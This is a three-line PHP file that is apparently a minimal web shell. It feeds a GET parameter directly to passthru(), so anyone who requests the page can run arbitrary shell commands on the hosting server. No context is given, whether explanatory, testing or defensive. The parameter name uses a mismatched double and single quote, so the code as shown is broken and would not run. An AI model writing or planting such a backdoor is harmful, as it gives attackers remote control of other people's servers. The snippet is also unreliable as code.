<?php
passthru($_GET["ic-AuucQ']);
?>
